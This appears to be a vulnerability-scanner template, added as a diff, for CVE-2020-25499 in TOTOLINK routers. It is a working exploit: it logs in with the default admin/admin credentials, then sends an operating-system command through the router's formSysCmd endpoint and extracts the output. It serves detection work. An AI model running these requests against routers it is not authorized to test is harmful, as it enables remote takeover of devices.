@@ -1,0 +1,49 @@
+id: CVE-2020-25499
+info:
+  name: TOTOLINK Routers Remote Command Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    TOTOLINK A3002RU-V2.0.0 B20190814.1034 allows authenticated remote users to modify the system's 'Run Command'. An attacker can use this functionality to execute arbitrary OS commands on the router.
+  reference:
+    - https://www.totolink.net/home/index/newsss/id/
+    - https://fofa.so/
+  classification:
+    cve-id: CVE-2020-25499
+
+http:
+  - raw:
+      - |
+        POST /boafrm/formLogin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        submit-url=%2Flogin.htm&userAgent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F92.0.4515.107+Safari%2F537.36&username=admin&userpass=admin&x=87&y=33
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        POST /boafrm/formSysCmd HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        submit-url=%2Fsyscmd.htm&sysCmd=echo+dfff0a7fa1a55c8c1a4966c19f6da452
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "dfff0a7fa1a55c8c1a4966c19f6da452"
+        part: body
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        name: command_output
+        part: body
+        regex:
+          - "virtual\">(.*?)</textarea>"
